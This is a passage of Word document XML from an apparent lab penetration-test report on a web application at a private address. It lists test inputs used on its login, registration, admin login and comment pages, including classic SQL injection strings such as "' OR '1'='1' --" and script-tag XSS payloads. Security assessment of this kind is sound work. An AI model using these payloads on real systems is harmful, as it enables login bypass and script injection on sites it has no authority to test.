    <w:p w14:paraId="416E9A7A" w14:textId="77777777" w:rsidR="001A6BBB" w:rsidRPr="001A6BBB" w:rsidRDefault="00B01179" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In order to check whether it was possible to spoof the referrer header the admin account was first logged in. </w:t>
      </w:r>
      <w:r w:rsidR="00A35027">
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>fter that the PHP session ID was then deleted so that the web application should believe that a non-authorized user was in the admin section. However, when attempting to navigate to a new page in the admin section the link was redirected to the access-denied.php page. This ensures that attackers cannot forge logins to the admin section in this manner.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B28FEE1" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00B01179" w:rsidP="004C3C01">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="34D4700D" wp14:editId="54DB7598">
            <wp:extent cx="5004595" cy="9239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4755" cy="931339"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC6DF4B" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E712D1E" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00257FFB" w:rsidP="00257FFB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="44" w:name="_Toc58836596"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Procedure: Test for Input-Based Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="44"/>
    </w:p>
    <w:p w14:paraId="46DCAEE4" w14:textId="77777777" w:rsidR="006D0026" w:rsidRDefault="006D0026" w:rsidP="006D0026">
      <w:r>
        <w:t xml:space="preserve">This section </w:t>
      </w:r>
      <w:r w:rsidR="00BB7026">
        <w:t xml:space="preserve">mainly involves using the spidering information gathered in section 1.1 in order to </w:t>
      </w:r>
      <w:r w:rsidR="00390EDA">
        <w:t>automatically perform</w:t>
      </w:r>
      <w:r w:rsidR="00BB7026">
        <w:t xml:space="preserve"> a test for pos</w:t>
      </w:r>
      <w:r w:rsidR="00B5117C">
        <w:t xml:space="preserve">sible </w:t>
      </w:r>
      <w:r w:rsidR="00390EDA">
        <w:t>input vulnerabilities.</w:t>
      </w:r>
      <w:r w:rsidR="00B5117C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00390EDA">
        <w:t>With the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008F6E78">
        <w:t xml:space="preserve">forms and data entry points identified in section 2.1 </w:t>
      </w:r>
      <w:r w:rsidR="00390EDA">
        <w:t>it will then be possible to verify and cross-examine results to ensure accuracy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2E3640" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRPr="006D0026" w:rsidRDefault="002A1D22" w:rsidP="006D0026"/>
    <w:p w14:paraId="56E3EB6C" w14:textId="77777777" w:rsidR="00EB687A" w:rsidRDefault="00EB687A" w:rsidP="00EB687A">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="45" w:name="_Toc58836597"/>
      <w:r>
        <w:t>Fuzz All Parameters</w:t>
      </w:r>
      <w:bookmarkEnd w:id="45"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CB7497" w14:textId="77777777" w:rsidR="00A35027" w:rsidRDefault="002759A9" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>Preforming</w:t>
      </w:r>
      <w:r w:rsidR="002A5EE3">
        <w:t xml:space="preserve"> an active zap scan</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Identified a number of different vulnerabilities </w:t>
      </w:r>
      <w:r w:rsidR="00475AD1">
        <w:t>in</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the web application</w:t>
      </w:r>
      <w:r w:rsidR="00475AD1">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="002A5EE3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BC6763">
        <w:t xml:space="preserve">After </w:t>
      </w:r>
      <w:r w:rsidR="00A35027">
        <w:t>the scan was preformed it was</w:t>
      </w:r>
      <w:r w:rsidR="00BC6763">
        <w:t xml:space="preserve"> compiled into a report</w:t>
      </w:r>
      <w:r w:rsidR="00A15493">
        <w:t xml:space="preserve">, available in </w:t>
      </w:r>
      <w:r w:rsidR="00A15493" w:rsidRPr="007577DE">
        <w:t>Appendix</w:t>
      </w:r>
      <w:r w:rsidR="00DA102C">
        <w:t xml:space="preserve"> 7.1</w:t>
      </w:r>
      <w:r w:rsidR="00A35027">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18447CFB" w14:textId="77777777" w:rsidR="003A64E9" w:rsidRDefault="00A35027" w:rsidP="00D777A5">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>In order to test the main vulnerabilities identified, namely SQL injection and X</w:t>
      </w:r>
      <w:r w:rsidR="004F7D58">
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>S, a comprehensive</w:t>
      </w:r>
      <w:r w:rsidR="00A15493">
        <w:t xml:space="preserve"> manual test </w:t>
      </w:r>
      <w:r w:rsidR="00D777A5">
        <w:t xml:space="preserve">was performed </w:t>
      </w:r>
      <w:r w:rsidR="00A15493">
        <w:t>on the web application.</w:t>
      </w:r>
      <w:r w:rsidR="00D777A5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A15493">
        <w:t>This was</w:t>
      </w:r>
      <w:r w:rsidR="00CD78B0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D777A5">
        <w:t>done</w:t>
      </w:r>
      <w:r w:rsidR="00CD78B0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A15493">
        <w:t>by</w:t>
      </w:r>
      <w:r w:rsidR="00CD78B0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A15493">
        <w:t>submitting</w:t>
      </w:r>
      <w:r w:rsidR="00C907FB">
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="00CD78B0">
        <w:t>follow</w:t>
      </w:r>
      <w:r w:rsidR="00C907FB">
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidR="00A15493">
        <w:t xml:space="preserve"> into the relevant sections of the website.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="8505" w:type="dxa"/>
        <w:tblInd w:w="817" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="992"/>
        <w:gridCol w:w="1276"/>
        <w:gridCol w:w="4258"/>
        <w:gridCol w:w="1979"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CD645A" w14:paraId="3EEA130F" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="992" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="167B5E89" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="003A64E9">
            <w:r>
              <w:t>Page</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1276" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="15E67956" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="003A64E9">
            <w:r>
              <w:t>Parameter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="45C9A5FB" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="003A64E9">
            <w:r>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="63F1662F" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="003A64E9">
            <w:r>
              <w:t>Appendix</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="0C463129" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6526" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="34E9F533" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="000E63EE">
            <w:r w:rsidRPr="000E63EE">
              <w:t>http://192.168.1.20/login-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="0E707BB3" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="000E63EE" w:rsidRDefault="00CD645A" w:rsidP="000E63EE"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="4F513356" w14:textId="77777777" w:rsidTr="001A2128">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="992" w:type="dxa"/>
          <w:trHeight w:val="806"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1276" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="7BD8AF08" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="000E63EE">
            <w:r>
              <w:t>login</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42BFCE80" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00C42A28"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="5361E36F" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="000E63EE">
            <w:r w:rsidRPr="0032101B">
              <w:t>&lt;/option&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;option&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D5EF87B" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00C42A28">
            <w:r>
              <w:t xml:space="preserve">*’ </w:t>
            </w:r>
            <w:r w:rsidRPr="00BE2462">
              <w:t xml:space="preserve">OR '1'='1' </w:t>
            </w:r>
            <w:r>
              <w:t>–</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F6F7ABF" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00C42A28">
            <w:r>
              <w:t>hacklab@hacklab.com’ AND</w:t>
            </w:r>
            <w:r w:rsidRPr="00BE2462">
              <w:t xml:space="preserve"> '1'='1' </w:t>
            </w:r>
            <w:r>
              <w:t>–</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="22C4D92A" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00C42A28">
            <w:r>
              <w:t>7.2</w:t>
            </w:r>
            <w:r w:rsidR="003342CF">
              <w:t>*</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74CBE9C2" w14:textId="77777777" w:rsidR="00C83DB6" w:rsidRDefault="00C83DB6" w:rsidP="00C42A28">
            <w:r>
              <w:t>7.3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DD3BEF2" w14:textId="77777777" w:rsidR="00C83DB6" w:rsidRPr="0032101B" w:rsidRDefault="00C83DB6" w:rsidP="00C42A28">
            <w:r>
              <w:t>7.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="78C5E09E" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6526" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="792B59E2" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00C42A28">
            <w:r w:rsidRPr="000E63EE">
              <w:t>http://192.168.1.20/register-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="0F2425AC" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="000E63EE" w:rsidRDefault="00CD645A" w:rsidP="00C42A28"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="327E02C3" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="992" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1276" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="5A4702E2" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00C42A28">
            <w:r>
              <w:t>name</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="7146911C" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="000E63EE" w:rsidRDefault="00CD645A" w:rsidP="00C42A28">
            <w:r w:rsidRPr="0032101B">
              <w:t>&lt;/option&gt;&lt;script&gt;alert(</w:t>
            </w:r>
            <w:r w:rsidR="00F70916">
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidRPr="0032101B">
              <w:t>);&lt;/script&gt;&lt;option&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3B39C66C" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00F70916" w:rsidP="00C42A28">
            <w:r>
              <w:t>7.</w:t>
            </w:r>
            <w:r w:rsidR="00C83DB6">
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="003342CF">
              <w:t>*</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="4576E7C6" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="992" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1276" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="273CD167" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00C42A28">
            <w:r>
              <w:t>login</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="633A18BC" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00C42A28">
            <w:r w:rsidRPr="000E63EE">
              <w:t>ZAP' AND '1'='1' --</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="46D3C69A" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="000E63EE" w:rsidRDefault="00F70916" w:rsidP="00C42A28">
            <w:r>
              <w:t>7.</w:t>
            </w:r>
            <w:r w:rsidR="00C83DB6">
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="2F91AF0B" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6526" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="7DA66AFF" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00C42A28">
            <w:r w:rsidRPr="000E63EE">
              <w:t>http://192.168.1.20/admin/login-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="7463B132" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="000E63EE" w:rsidRDefault="00CD645A" w:rsidP="00C42A28"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="43BC8E2A" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="992" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1276" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="02F517C9" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00C42A28">
            <w:r>
              <w:t>password</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="0F9E24E2" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="000E63EE" w:rsidRDefault="00CD645A" w:rsidP="00C42A28">
            <w:r w:rsidRPr="000E63EE">
              <w:t>password' OR '1'='1' --</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="40F9A1AF" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="000E63EE" w:rsidRDefault="00F70916" w:rsidP="00C42A28">
            <w:r>
              <w:t>7.</w:t>
            </w:r>
            <w:r w:rsidR="00C83DB6">
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="1136BDF7" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="992" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1276" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="33A6C80F" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r>
              <w:t>login</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2055C962" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r w:rsidRPr="000E63EE">
              <w:t>admin' AND '1'='1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="161B7797" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r w:rsidRPr="000E63EE">
              <w:t>ZAP' OR '1'='1' --</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="36C79E2B" w14:textId="77777777" w:rsidR="00F70916" w:rsidRDefault="00F70916" w:rsidP="00E34950">
            <w:r>
              <w:t>7.</w:t>
            </w:r>
            <w:r w:rsidR="00C83DB6">
              <w:t>7</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="230BA7F2" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="000E63EE" w:rsidRDefault="00F70916" w:rsidP="00E34950">
            <w:r>
              <w:t>7.</w:t>
            </w:r>
            <w:r w:rsidR="00C83DB6">
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="213BD240" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6526" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="7C227868" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="000E63EE" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r w:rsidRPr="0032101B">
              <w:t>http://192.168.1.20/member-ratings.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="51721927" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="42B1C6AE" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="992" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1276" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="0EFD9601" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r>
              <w:t>comment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3170530B" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="000E63EE" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r w:rsidRPr="0032101B">
              <w:t>&lt;/td&gt;&lt;script&gt;alert(</w:t>
            </w:r>
            <w:r w:rsidR="00F70916">
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidRPr="0032101B">
              <w:t>);&lt;/script&gt;&lt;td&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3D2EAD0E" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00F70916" w:rsidP="00E34950">
            <w:r>
              <w:t>7.</w:t>
            </w:r>
            <w:r w:rsidR="00C83DB6">
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="54707109" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6526" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="391FDDD3" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r w:rsidRPr="0032101B">
              <w:t>http://192.168.1.20/tables.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="168DAE9D" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="15AAC23C" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="992" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1276" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="78AD425A" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r>
              <w:t>name</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="29D77FF7" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r w:rsidRPr="0032101B">
              <w:t>&lt;/option&gt;&lt;script&gt;alert(</w:t>
            </w:r>
            <w:r w:rsidR="00C83DB6">
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidRPr="0032101B">
              <w:t>);&lt;/script&gt;&lt;option&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
